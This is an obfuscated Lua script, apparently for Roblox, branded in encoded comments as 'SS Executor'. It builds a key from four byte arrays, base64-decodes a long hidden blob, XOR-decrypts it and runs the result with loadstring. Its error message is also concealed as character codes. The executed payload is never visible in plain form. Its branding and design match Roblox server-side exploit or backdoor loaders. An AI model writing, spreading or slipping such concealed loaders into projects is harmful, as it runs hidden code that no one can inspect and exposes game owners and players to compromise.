-- string.char(40,99,41,32,83,83,32,69,120,101,99,117,116,111,114,32,32,124,32,32,85,110,97,117,116,104,111,114,105,122,101,100,32,99,111,112,121,105,110,103,32,111,114,32,114,101,100,105,115,116,114,105,98,117,116,105,111,110,32,105,115,32,112,114,111,104,105,98,105,116,101,100,46)
-- string.char(83,111,117,114,99,101,58,32,103,105,116,104,117,98,46,99,111,109,47,114,111,98,108,111,120,115,99,114,105,112,116,101,114,54,50,52,53,51,54,54,53,52,50,47,114,111,98,108,111,120,45,108,117,97,45,111,98,115,99,97,116,111,114)

local _c=string.char;local _fc=string.find;local _sb=string.sub
local _tc=table.concat;local _mf=math.floor;local _ld=loadstring or load

local _K1={247,234,65,172,27,190,5,160,127,210,9,212,35,38,77,72}
local _K2={7,186,209,252,43,142,149,240,143,162,153,36,51,246,221,152}
local _K3={23,138,97,76,59,94,37,64,159,114,41,116,67,198,109,232}
local _K4={39,90,241,156,75,46,181,144,175,66,185,196,83,150,253,56}

local _K={}
for _,v in ipairs(_K1)do _K[#_K+1]=v end
for _,v in ipairs(_K2)do _K[#_K+1]=v end
for _,v in ipairs(_K3)do _K[#_K+1]=v end
for _,v in ipairs(_K4)do _K[#_K+1]=v end

local _A=_c(65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47)

local function _bd(_i)
    local _r,_v,_b={},0,0
    _i=_i:gsub('[^'.._A..'=]','')
    for _n=1,#_i do
        local _ch=_sb(_i,_n,_n)
        if _ch=='=' then break end
        local _p=_fc(_A,_ch,1,true)
        if not _p then break end
        _v=_v*64+(_p-1);_b=_b+6
        if _b>=8 then
            _b=_b-8
            _r[#_r+1]=_c(_mf(_v/2^_b)%256)
            _v=_v%(2^_b)
        end
    end
    return _tc(_r)
end

local function _xd(_d,_k)
    local _r,_kl={},#_k
    for _i=1,#_d do
        local _a,_bv=_d:byte(_i),_k[((_i-1)%_kl)+1]
        local _rs,_bt=0,1
        while _a>0 or _bv>0 do
            if _a%2~=_bv%2 then _rs=_rs+_bt end
            _a=_mf(_a/2);_bv=_mf(_bv/2);_bt=_bt*2
        end
        _r[_i]=_c(_rs)
    end
    return _tc(_r)
end

local _P=''
_P=_P..'2sdhkSaDOJ1C7zTpHhtwdTqH7MEWs6jNsp+kGQ7L4KUqt1xxBmMYfaJPFEl++1DVGmfMoXYTiK2S'
_P=_P..'f4T5bqvABcrXfKY2kyWAMZdRgXAGCBBC+YSoZNy10G0iCgQTu7L8YuYAPhscSi/rAV0GIrZnxQp6'
_P=_P..'0dkqTd2wwi3dsT/z3VGEyi3DetpgxF+kYLUDTzk7J9Wmkgv+9pHjzrkPE5qy+XP5FT5SMEJgtFJh'
_P=_P..'ADe2Ko1TdPuxZg6V2cli1qo2tptZnoYyjHLKJdceoGenA0cjLCfZvpJf5/uF6tG5xrNi/fZ4/gkl'
_P=_P..'VTkFI+0TWhwmtUPiCnfRoXYTiK2Sf4T5bqvABcrXfJEmgzidQu806R4bcHU6h+zBFrOozbKfpBkO'
_P=_P..'y+ClKrdccQZjGH2iTxRJfvtQ1RpnzJZBQtrzzi6Zmzz90RiojzPeO4Ml0ByzZbgLQDgmZM64k0Wm'
_P=_P..'vPqFj7QE0WJdeoMKQR9eLFMp/BdaVKFS7Qqz2hMIy8whEE3WOSbHFh+sdwjVLPkqhULrUutAo8TZ'
_P=_P..'yOUuUR6/DndkD0ANpNFiXXqDCoPYu7yxwH3mqZbXRo98p7hlHKm6NXI7wltQ03RpuBV+wU6PPuc0'
_P=_P..'/zCdVMGyzaqTOjNoq2wBcG02Gcandj8Ml2j1zNnKpaIL8svgwyT5aMXOcX7frlcEL6AtRLECfdpj'
_P=_P..'aqM4m1yRIJ1GiTa3pq/ch1hFfMkaFRIbInuwsxRJGPUe4a6v3sfUH5C99KFS7Qqz2vvwJE3U/I8S'
_P=_P..'1aUq849L19dhy3rTYJo4t32HRlQ7IWTf+d574vSJ6tDqBhr8sfd06w1saQ0FYL9SCVR+5gqJSj/L'
_P=_P..'2y5a5vXdNNCnNr7fapKaLcV433HFG4F9u1FHKi0lk9uQRO30nK/30HcT1v24N7dBK1ozQHrYF10n'
_P=_P..'JrQbgUQ/2b4eXdDi5izJsSfFmEqBgyLJOZcPzBCxaLgDch5oJ5rx3AuztZfuz/wedJOpy3L4FyVY'
_P=_P..'Ow1iywVMES2VCJpRM5L5aQe/moJvmSbHFh+sd8oWzXLKJcYQoCmYTEUsJFfWsIVO/LUSGyJ7sLMU'
_P=_P..'SRj1HuGur97H1B+QvfShUu0Ks9oTCMvMIRBN1jkmxxYfrHcI1Sz5KoVC61LrQKPE2cjlLlEevw53'
_P=_P..'ZA9ADaTRYl16gwqD2Lu8scB95qmW10aPfKe4ZRypujVyO8JbUNN0abgVfsFOjz7nNP8wnVTBss2q'
_P=_P..'kzozaKtsAXBtNhnGp3Y/DJdo9czZyqWiC/LL4MMk+WjFznF+365XBC9I1asw95EYu7pLynTMJf9f'
_P=_P..'7ynlDwZ8ejeatZMhrrXQr+7JBA7WjfR28wQ+SHBpL/wTRSQvpxSNVVDRvGsO3PaPDunkJ/6YVteI'
_P=_P..'M8l61SXFEbYD9AMGbTxmybrSXO/8hKeStxUa/Lj2c4AIKhswSjS/PnlUN64IhgctkO4lBpfL4SfB'
_P=_P..'sSDL3XaYyg3DeN9p8BOzcLFRBiwuc9+j3Bq8tYOhgLAfE4S47GL4D2xeMEFKlR5GFyKqTbhgL5i8'
_P=_P..'dg75wJUV2K0n0JJKtIIowH+WJ/ATs3CxUWE4ISWW8c0ep5+Z6YL3S0fWjd9i40E4UztLYOgTWxpr'
_P=_P..'5DamQiKE7xYO+/+PEtWlKvOPf4KDb44yhSXSGqZ8pk0GKCZjsNvRBq7HleLN70EThan5e+9BC24X'
_P=_P..'BSbtHURUIuYdmkIsmPM+XZX5wSjcpyf/klb9hi7PetIlzxO2KekDdgo9boCXlUXq05n90e1nW5+x'
_P=_P..'/D+oPhNoDXoFxzdqKxzkROJOPNHzJ0qV5Mcn1+Q8+pkCs48y2GnRfIhW8my6RyxHZSqaM2irbAFw'
_P=_P..'r+72RVefs/835A44UjhMI/4GQBst5o98p7hlHKm6NXI7wltQ03RpuBV+wU6PPuc0/zCdVMGyzaqT'
_P=_P..'OjNoq2wBcG02Gcandj8Ml2j1zNnKpaIL8svgwyT5aMXOcX7frlcEL6AtRLECfdpjaqM4m1yRIJ1G'
_P=_P..'iTa3pq/ch1hFfMkaFRIbInuwsxRJGPUe4a6v3sfUH5C99KFS7Qqz2hMIy8whEE3WOSbHFh+sdwjV'
_P=_P..'LPkqhULrUutAo8TZyOUuUfZb7fSc44r/UV2VqfF45EllMX4FYL8VSBkm/CqNUwmU7j1H1vWHYOqw'
_P=_P..'MuSJXYWtNMU5lz/zGqZKu1FDZWpU37+YZeHhmenL+kVHn7L2NaZrbBt+BWC/UgkPF68ZhEJn09Iu'
_P=_P..'VsDjjwfBoTDjiVeFyG2MT9t91ELwRbtCQiQmYJT/0gmitbT60PhQWpmzpST3SEZeMEFplXgEWWMk'
_P=_P..'+WjFznG8GEbU4sommaoy+5hLh4siyTtckSCdRok2t6av3IdYRXzJGhUSGyJ7sLMUSRj1HuGur97H'
_P=_P..'1B+QvfShUu0Ks9oTCMvMIRBN1jkmxxYfrHcI1Sz5KoVC61LrQKPE2cjlLlEevw53ZA9ADaTRYl16'
_P=_P..'gwqD2Lu8scB95qmW10aPfKe4ZRypujVyO8JbUNN0abgVfsFOjz7nNP8wnVTBss2qkzozaKtsAXBt'
_P=_P..'NhnGp3Y/DJdo9czZyqWiC/LL4MMk+WjFznGWJ0HW8cNi64UEtsAY1YI12GvNP49QoGijDUEkPG/P'
_P=_P..'s4lY6+eT4MztQV2C8/t4504+VDxJL+cBSgYqthmNVWzDqH4dg6aadovrIfmfVJiSbMBu3yjPHaFq'
_P=_P..'tVdJP2dk1rCJT+u6g+rR6k1cmPDNU/oKexR8L0rANQcrEJVN1Qch+7xrDpXC7hWElhLB0Ri7unzg'
_P=_P..'S5Il8DinYOlzYTghK7Dx3AuuxZzu2/xWQMuN9HbzBD5IcgUSzE97J2/mOKF0Z6TVGAKVxPx/7Zd/'
_P=_P..'nIAy/cdsjPkqhULrUimBUENtJGjbtY9f/Pye6IL2VhOasvlzqoPMr35SL+0ZWlQsqE2sQjaF/WcO'
_P=_P..'5unBI8m3Nrrdc4WELYA7+GnVB6d6+ANDOSsnWEV8yRoVEhsie7CzFEkY9R7hRlcxRiHzUnYYJ+ZQ'
_P=_P..'yEs1kPg4Wsf5wSWZqyG2kVeWjkumNpMlQupC60GzxNjY5S9BHr4ed2UfQAy00WNNeoIag9mrvLDQ'
_P=_P..'fee5ltZWj323uGQMqbslcjrSW1HDdGioFX/RTo4u5zXvMJxEwbPdqpIqM2m7bABgbTcJxqZmPw2H'
_P=_P..'aPTc2cu1ogriy+HTJPh4xc9hft6+VwU/oCxUsQNt2mJ6ozmLXJAwnUeZNra2r92XWERsyRsFEhoy'
_P=_P..'e7GjFEgI9R/xrq7Ox9UPkLzkoVP9CrLKEwnbzCAATdcpJsYGH61nCNQ8+SuVQupC60GzxNjY5S9B'
_P=_P..'Hr4ed2UfQAy00WNNeoIag9mrvLDQfee5ltZWj323uGQMqbslmoJvmeQQ2a9916YI7kn/V+k6gSn0'
_P=_P..'C0MsK2+auJIL5+GDr83uShOGvvl75kGuu8oFJv4bRQExo02fRiif72tMwOSPLNyyNuTdW4WLMsR+'
_P=_P..'zSyqUv8pNra2r92XWERsyRsFEhoye7GjFEgI9R/xrq7Ox9UPkLzkoVP9CrLKEwnbzCAATdcpJsYG'
_P=_P..'H61nCNQ8+SuVQupC60GzxNjY5S9BHr4ed2UfQAy00WNNeoIag9mrvLDQfee5ltZWj323uGQMqbsl'
_P=_P..'cjrSW1HDdGioFX/RTo4u5zXvMJxEwbPdqpIqM2m7bABgbTcJxqZmPw2HaPTc2cu1ogriy+HTJPh4'
_P=_P..'xc9hft6+VwU/oCxUsQNt2mJ6ozmLXJAwnUeZNra2r92XWERsyRsFEhoye7GjFEgI9R/xrq7Ox9UP'
_P=_P..'kLzkoVP9CrLKEwnbzCAATdcpzlm70BjGxGH4c9toxUXyartPST87K5q3k0X65tyv9u5BVpiU9nHl'
_P=_P..'EkZXMUYh81JdHCarCKdMdtHoI0vY9eowy+Ruto1bloYthH3La8MLu2a6Cw9HaCea8Y5O+uCC4YLG'
_P=_P..'SFfeuvl671sETypVB/oGASYCkUPGBTaY/mRa3fXCJ5eoJvffFNeeM9l+lyyIVthsukcPRyFhmr+T'
_P=_P..'X67hmOrP/GtY1qnwcuRBO1osS2i9KWcRO7MetQcumfkmS5v82iOZojL/kV2T0GGONZBxzwyme71N'
_P=_P..'QWU8b9+8mW7859mmgvxKV/zXtTqqU2IbC2xg9xdFBCa0HtIHHIPxZGLX/IAAzap835NI2KkuwjTt'
_P=_P..'ZtJQumaiDEUiOmnfo9NY+uef5Me2VFKS8vR++RUEFDJMM+skBgYssS+JVXWF60FC2vPOLpmxOtmW'
_P=_P..'FNefKOlpzCWdX6JqtU9KZS5y1LKIQuH72KaouQQT1q/9Y/8TIhsBSSS3FUgZJvwlnFMqtvk/BufR'
_P=_P..'+GyX5j//nxeCg2/Abt8njF+me6FGD2RgLrC0kk+nn5npgvdLR9ao8VjhQThTO0tg6BNbGmvkNqZC'
_P=_P..'IoTvFg7A+YEuzKVz8JxRm48lljucK44LvXqgUU8jLy/PuLlZ/LzZr8f3QDn88LU3uU9seSxMJPgX'
_P=_P..'E1QzrwOPZSiY+CxLmbDMI9WoEeSUXJCPbYxZzGzEGLcppkZARyRo2bCQC+znmevF/GtY2v36ZeMF'
_P=_P..'K14bVzK/TwkEIKcBhA88hPIoWtz/wWqQznO23RiFjzXZadAl/xO2IbNCSyhyT86ljGzr4djd484K'
_P=_P..'HdSx8XWlAz5SOkIlsR5cFWHqTZxVL5S1Ygacmsos3e1Z/5sYmYU1jHnMbMQYt0a/A1IlLWmapp1Z'
_P=_P..'4L3S1Oz8XEaFgLh1+AgoXDsLLOoTCRIirwGNQ2DRvmUAwf/cNsutPfHVWoWDJct++3fSVvspsU1C'
_P=_P..'R0Iql/HIBa7CmeHG9lMJ1orRWaU1DnoMChPWNmxbAYkpsQt6n/k8etTyg2LKrDzhrVmQj22Mf8xk'
_P=_P..'x1PyZL1NTyAhfd/bkETt9Jyv1fBKV5mq13ymQTtSMEEv6DdbBmP7TZhEO53wY0jA/sw20Ks9vtQy'
_P=_P..'18phjGnbcdUNvCmLT0JlL2bXtMZj+uGAyMftDGG3irY5qA0lWXFSKfEWRgNtqhiJBXbR6Dlb0LmG'
_P=_P..'apDONviZEf2DJ4x10XGACLtnsExRAiMnzrmZRa7ikf3MsQZouLjgYvk8bEw3SyTwBQcYNqdNjkYz'
_P=_P..'nfkvFJWygWzNqyDij1GZjWnbctBhzwiXe6YKD3Zodd+liVngtZXhxpMuHtv9eoIag9mrvLDQfee5'
_P=_P..'ltZWj323uGQMqbslcjrSW1HDdGioFX/RTo4u5zXvMJxEwbPdqpIqM2m7bABgbTcJxqZmPw2HaPTc'
_P=_P..'2cu1ogriy+HTJPh4xc9hft6+VwU/oCxUsQNt2mJ6ozmLXJAwnUeZNra2r92XWERsyRsFEhoye7Gj'
_P=_P..'FEgI9R/xrq7Ox9UPkLzkoVP9CrLKEwnbzCAATdcpJsYGH61nCNQ8+SuVQupC60GzxNjY5S9BHr4e'
_P=_P..'d2UfQAy00WNNeoIag9mrvLDQfee5ltZWj323uGQMqbslcjrSW1HDdGioFX/RTo4u5zXvMJxEwbPd'
_P=_P..'QiqX8dx/z9fQwu3dcX+zjrg3ogQtWDYFKfFSQAAw5gKfSXqB/ypC2bmlb5TksQNt2mJ6ozmLXJAw'
_P=_P..'nUeZNra2r92XWERsyRsFEhoye7GjFEgI9R/xrq7Ox9UPkLzkoVP9CrLKEwnbzCAATdcpJsYGH61n'
_P=_P..'CNQ8+SuVQupC60GzxNjY5S9BHr4ed2UfQAy00WNNeoIag9mrvLDQfee5ltZWj323uGQMqbslcjrS'
_P=_P..'W1HDdGioFX/RTo4u5zXvMJxEwbPdqpIqM2m7bABgbTcJxqZmPw2HaPTc2cu1ogriy+HTJPh4xc9h'
_P=_P..'ft6+VwU/oCxUsQNt2mJ6ozmLXJAwnUeZNra2r92XWERsyRsFEhoye7GjFEgI9R/xrq7Ox9UPkLzk'
_P=_P..'ScxAxQcOkP5rH4+w6jrcpybimBjfqS3FftBxgDOBKfsDdSg6cd+j3Gfdtd+v8PxVRp+v/TelQRlp'
_P=_P..'EgUF5xdKXUmqAotGNtH5M0vW38RumaEr8559hZhhkTvOZsETviGyVkguPG7Vv9QChLXQr4LrQUeD'
_P=_P..'r/Y31Q0oEzlELfpIYQA3tiqNU3Kj3RwAm7LbI9u3fPOFXZSfNck10nDBXf4poFFTKGEukvj2TuDx'
_P=_P..'2YXL/wRdmam4cvIEL3Q1BTT3F0dUNKcfhg94qtIuVsDj8mLcvDb1iEySxC3Zep5jwRa+bLAZBm9m'
_P=_P..'Kc6+j1/8/J7oivxcVpWY6mWjSGxeMEFKlV8EVBenD8gVYNHPLlzD9d1i2qs++5xWk5lLwHTdZMxf'
_P=_P..'oWymVUM/B2yW8Y9O/OOV/efrVhPL/eh06w0gEzhQLvwGQBst7kTiB3rRvDlLweXdLJmbP/LVX5aH'
_P=_P..'JJZTynHQOLd9/HFnGmYpmKWdSf26g+rQ70FB2LHtdqhNbE8sUCW2WwFdSaMDjA5QmPprQNrkjzHc'
_P=_P..'tiXzj3ecyjXEftAl1x6gZ/wBfQMtf8+ioQv98IL5x+sKX4O8uHHrCCBeOh9gvVwHACy1GZpONJa0'
_P=_P..'OEvH5sow/LYhv9QYkoQlphGTKIArs2v0EBxtG2bUtZ5E9rWS9tL4V0D8sfd06w1sSD9LJP0dUTso'
_P=_P..'6k2bRjSV/iRW8OLdYoTkI/WcVJvCJ9l13XHJELwh/SkGbWgnyLSIXvz70NDO/QxUl7D9LcIVOEsZ'
_P=_P..'QDS3IGgjbehPnEY4grM4T9v0zS3B6j/jnBrbyjXebtssiVf7A7FNQmRCbtzxkkT6tYPuzP1GXI6S'
_P=_P..'8zf+CSlVflIh7RwBVhiICJBSKay8OE/b9M0tweo/45wYkYsowH7aP4Bd/CegTFU5Om7UttRY7/uU'
_P=_P..'7c3hYUGE9LE37w8oMVQIbb8mSBZj8lfIajud6ypc0LDcIdiqPfOPMpuFIs13nmjBE6VopkZpJmQn'
_P=_P..'17CQXO/nlcrQ6wQO1q37duYNZF0rSyPrG0Yaa+9nyAd60e4uWsDiwWLmqDe+mlmaj3vkb8p15xqm'
_P=_P..'IYZicWNmJc6wnlih+JHj1fhWVtix7XaoTWxPLFAltlsBXUmjA4wOUJj6a0Da5I8v2Kgk949duIFh'
_P=_P..'2HPba4AIs3u6CwQWBmLCpI92rviR49X4VlbYse12qgctUjJAJKVSC1ptsgKbUyiY8iwG2PHDNdi2'
_P=_P..'NtOPSt7DYcl12g+qUv8pgEJEbX09mpWZROzzhfzB+FBchNf0eOkAIBs6QC/9PUJYY6IIh0Ufg+5r'
_P=_P..'E5XgzCPVqHvwiFaUnijDdZYsql/yKfRRQzk9ddTxo0fqvZfuz/wee4Kp6FDvFWRpH3JusVBdFSG1'
_P=_P..'QoxCNZP6Pl3WvsM32OZ/tolKgo9ohTOXD8URtiDeSkBtJmjO8ZhO4fe/5ILtTFaY/e92+A9kGQVr'
_P=_P..'JecHWiljogiHRTyE7ygA2eXOYt+lOvqYXM3KY4I1ymrTC6BgukQOKS1o2JSOWae80OrM/S452/C4'
_P=_P..'Q+sDbA1kBQbqHEoAKqkDyEQylP8gS8ewhyPVtzy2kVeWjjKMf99xwVCnZ7cPBikpc9v+j17g9tyv'
_P=_P..'xvhQUtmw4WXjACgbN0s0+gBHFS+qFMEtNp7/KkKV88cn2q825LJT28oixH7dbsUNl3umAxttOGTb'
_P=_P..'vZAD6OCe7NbwS13e9JI3qkFsSTtRNe0cCSsvokWPRjeUpgNaweDoJ83sAdeqFtnINc15zSrDF7dq'
_P=_P..'v0ZUYyRy2/PQC/rnheqLsAwa/Lj2c6NrJV1+Sy/rUkocJqUGjVUVmrw/RtD+jzXYtj2+32O5jznZ'
_P=_P..'aOMlwxe3ar9GVGMkctvxmkrn+ZXrmLkGHdip92T+EyVVOQ0j9xdKHya0KJpVc9i8LkDRmqVvlOQH'
_P=_P..'958YwNBh/3jMbNAL8mGhQSwhJ2TbvdxY7eeZ/9bqa1ja/et0+Ag8Ty1gMu1SFFQzpQyES3KX6SVN'
_P=_P..'wfnALJHtWbbdGNeYJNhuzGuAIL5t/ERHIC098qWIW8nwhKfw2HMd2P/sdugSY0g9VynvBlpaL7MM'
_P=_P..'ygt6he4+S5y5h2uzoT3y1DKejGHCdMol0xygYKRXVQIjJ865mUWu4pH9zLEGaLi44GL5PGxIPVcp'
_P=_P..'7wZaWi+zDMhBO5jwLkqPsI1sl7A85YlKnoQmhGjdd8kPpnqRUVRkYSffv5ghhLjdr/b4RhPO57hS'
_P=_P..'5BclSTFLLfocXVQnrwyPSTWC6CJNxprDLdqlP7aYVoGlKoA722vWOqB79B4GPStm1r3UTfv7k/vL'
_P=_P..'9kob39e4N6pBPl4qUDLxUnYYJ+4KiUo/y9Q/WsXXyjaRlhLB0xbVniDOaJFgzgn8ZaFCBGFoc8ik'
_P=_P..'mQKnvdmFx/dAGvy0/jfkDjgbO0s20BkJACujA8hQO4PyYwzu3so6zLcOtphWgcQt2XqeY8EWvmyw'
_P=_P..'GQZvZinOvo9f/Pye6Ir8SkWzr+o+o0EpVTovSrJfCZbWVo99t7hkDKm7JXI60ltRw3RoqBV/0U6O'
_P=_P..'Luc17zCcRMGz3aqSKjNpu2wAYG03CcamZj8Nh2j03NnLtaIK4svh0yT4eMXPYX7evlcFP6AsVLED'
_P=_P..'bdpieqM5i1yQMJ1HmTa2tq/dl1hEbMkbBRIaMnuxoxRICPUf8a6uzsfVD5C85KFT/QqyyhMJ28wg'
_P=_P..'AE3XKSbGBh+tZwjUPPkrlULqQutBs8TY2OUvQR6+HndlH0AMtNFjTXqCGoPZq7yw0H3nuZbWVo99'
_P=_P..'t7hkDKm7JXI60ltRw3RoqBV/0U6OLuc17zCcRMGz3aqSKjNpu2wAYG03CS4e2/24UcMvDXcXdgWV'
_P=_P..'XwRUoVP9CrLKEwnbzCAATdcpJsYGH61nCNQ8+SuVQupC60GzxNjY5S9BHr4ed2UfQAy00WNNeoIa'
_P=_P..'g9mrvLDQfee5ltZWj323uGQMqbslcjrSW1HDdGioFX/RTo4u5zXvMJxEwbPdqpIqM2m7bABgbTcJ'
_P=_P..'xqZmPw2HaPTc2cu1ogriy+HTJPh4xc9hft6+VwU/oCxUsQNt2mJ6ozmLXJAwnUeZNra2r92XWERs'
_P=_P..'yRsFEhoye7GjFEgI9R/xrq7Ox9UPkLzkoVP9CrLKEwnbzCAATdcpJsYGH61nCNQ8+SuVQupC60Gz'
_P=_P..'xNjY5S9BHr4ed2UfQAy0OZ+7uEjNTxNoDQsz9x1eJCKhCMgHetHoI0vbsPAFl5sAxdNLn4U2/HrZ'
_P=_P..'YIhO+yn0A0MjLA3Tt9x0ybuv3PG3TV2fqdt/7wInXiwFNPcXR1QcgUO3dAnf9SVHwdPHJ9qvNuTV'
_P=_P..'EdePL8gRtHXDHr5l/EVTIytz076SA6ef0K+CuUNSm7iiUO8VH14sUyn8FwFWELIMmlM/g9s+R5e5'
_P=_P..'lRHcsBD5j13fyBLJddpLzwu7b71ARzkhaNTz0CGutdCvgrkEE42J8WPmBHEZEEA46gEJMTujDp1T'
_P=_P..'NYO+Zw7h9dc2hOYf+Zxcko5hToctJ4xflnymQlIkJ2mH44EChPCe64uTLlaYubE3qkxhGztLJL8d'
_P=_P..'XAAmtE2YRDud8EEk3PaPLNawc8mSU9eeKcl1nnLBDbwh9nhoKDByyYzceNrUotv3yQR2pI/XRbBB'
_P=_P..'bhVwUS/sBlsdLaFFt0Iog7ViDtD+y0g='

local _fn,_er=_ld(_xd(_bd(_P),_K))
if not _fn then
    warn(string.char(91,83,83,32,69,120,101,99,117,116,111,114,93,32,76,111,97,100,32,101,114,114,111,114,58,32)..tostring(_er))
else
    _fn()
end
